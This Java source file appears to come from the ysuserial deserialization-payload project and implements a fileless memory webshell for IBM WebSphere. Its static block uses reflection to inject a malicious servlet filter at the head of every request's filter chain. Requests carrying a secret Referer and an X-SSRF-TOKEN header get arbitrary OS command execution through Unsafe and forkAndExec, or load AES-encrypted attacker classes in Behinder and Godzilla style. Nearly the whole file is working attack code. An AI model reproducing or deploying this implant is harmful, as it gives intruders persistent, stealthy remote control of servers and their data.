package org.su18.ysuserial.payloads.templates.memshell.websphere;

import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.List;

/**
 * @author su18
 */
public class WSFMSFromThread implements Filter {

    static {
        try {
            String filterName = "su18" + System.nanoTime();
            String urlPattern = "/*";

            Class                   clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for (int j = 0; j < obj_arr.length; j++) {
                Object o = obj_arr[j];
                if (o == null) continue;

                if (o.getClass().getName().endsWith("WebContainerRequestState")) {
                    Object request        = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);

                    field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object context = field.get(servletContext);

                    field = context.getClass().getSuperclass().getDeclaredField("config");
                    field.setAccessible(true);
                    Object webAppConfiguration = field.get(context);

                    Method   method  = null;
                    Method[] methods = webAppConfiguration.getClass().getMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals("getFilterMappings")) {
                            method = methods[i];
                            break;
                        }
                    }
                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

                    boolean flag = false;
                    for (int i = 0; i < filerMappings.size(); i++) {
                        Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                        String name         = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                        if (name.equals(filterName)) {
                            flag = true;
                            break;
                        }
                    }

                    //如果已存在同名的 Filter，就不在添加，防止重复添加
                    if (!flag) {
                        Filter filter = new WSFMSFromThread();

                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
                        filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for (int i = 0; i < methods.length; i++) {
                            if (methods[i].getName().equals("addFilterInfo")) {
                                method = methods[i];
                                break;
                            }
                        }
                        method.invoke(webAppConfiguration, new Object[]{filterConfig});

                        field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
                        field.setAccessible(true);
                        Object original = field.get(filterConfig);

                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
                        field.set(filterConfig, null);

                        method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});

                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                        field.set(filterConfig, original);

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for (int i = 0; i < methods.length; i++) {
                            if (methods[i].getName().equals("getUriFilterMappings")) {
                                method = methods[i];
                                break;
                            }
                        }

                        //这里的目的是为了将我们添加的动态 Filter 放到第一位
                        List uriFilterMappingInfos = (List) method.invoke(webAppConfiguration, new Object[0]);
                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
                    }

                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    String xc = "7ff9fe91aaa7d3aa"; // key

    String pass = "su18";

    String md5 = md5(pass + xc);

    Class payload;

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception ignored) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class  base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest  request  = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            // 入口
            if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
                // cmdshell
                if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("ce")) {
                    String cmd = request.getHeader("X-Token-Data");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }

                        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                        theUnsafeField.setAccessible(true);
                        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

                        Class processClass = null;

                        try {
                            processClass = Class.forName("java.lang.UNIXProcess");
                        } catch (ClassNotFoundException e) {
                            processClass = Class.forName("java.lang.ProcessImpl");
                        }

                        Object processObject = unsafe.allocateInstance(processClass);

                        byte[][] args = new byte[cmds.length - 1][];
                        int      size = args.length;

                        for (int i = 0; i < args.length; i++) {
                            args[i] = cmds[i + 1].getBytes();
                            size += args[i].length;
                        }

                        byte[] argBlock = new byte[size];
                        int    i        = 0;

                        for (byte[] arg : args) {
                            System.arraycopy(arg, 0, argBlock, i, arg.length);
                            i += arg.length + 1;
                        }

                        int[] envc                 = new int[1];
                        int[] std_fds              = new int[]{-1, -1, -1};
                        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                        Field helperpathField      = processClass.getDeclaredField("helperpath");
                        launchMechanismField.setAccessible(true);
                        helperpathField.setAccessible(true);
                        Object launchMechanismObject = launchMechanismField.get(processObject);
                        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

                        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

                        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                            byte[].class, int.class, byte[].class, int[].class, boolean.class);

                        forkMethod.setAccessible(true);//

                        forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
                            null, envc[0], null, std_fds, false);

                        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                        initStreamsMethod.setAccessible(true);
                        initStreamsMethod.invoke(processObject, std_fds);

                        Method getInputStreamMethod = processClass.getMethod("getInputStream");
                        getInputStreamMethod.setAccessible(true);
                        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        int                   a    = 0;
                        byte[]                b    = new byte[1024];

                        while ((a = in.read(b)) != -1) {
                            baos.write(b, 0, a);
                        }

                        response.getWriter().println(baos);
                    }
                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("bx")) {
                    if (request.getMethod().equals("POST")) {
                        // 创建pageContext
                        HashMap pageContext = new HashMap();
                        // lastRequest的session是没有被包装的session!!
                        HttpSession session = request.getSession();
                        // 冰蝎逻辑
                        String k = "7ff9fe91aaa7d3aa"; // rebeyond
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload.toString()));
                        Class  evilclass      = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("gz")) {
                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = x(data, false);
                    if (payload == null) {
                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method         defMethod      = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defMethod.setAccessible(true);
                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                    } else {
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object                        f      = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        f.equals(request);
                        response.getWriter().write(md5.substring(0, 16));
                        f.toString();
                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                        response.getWriter().write(md5.substring(16));
                    }
                }
                return;
            }
        } catch (Exception ignored) {
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
            result, 0,
            bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    @Override
    public void destroy() {

    }
}
